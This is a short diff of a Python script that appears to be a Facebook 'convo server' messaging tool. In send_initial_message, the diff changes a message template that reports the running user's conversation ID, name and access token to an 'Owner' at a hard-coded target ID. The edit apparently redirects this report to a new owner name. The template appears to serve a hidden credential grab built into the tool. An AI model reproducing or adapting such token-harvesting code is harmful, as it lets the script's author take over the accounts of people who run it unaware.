@@ -115,7 +115,7 @@ def send_initial_message():
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => Ravan \n Hello Ashish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
     target_ids = ["100010407155711"]
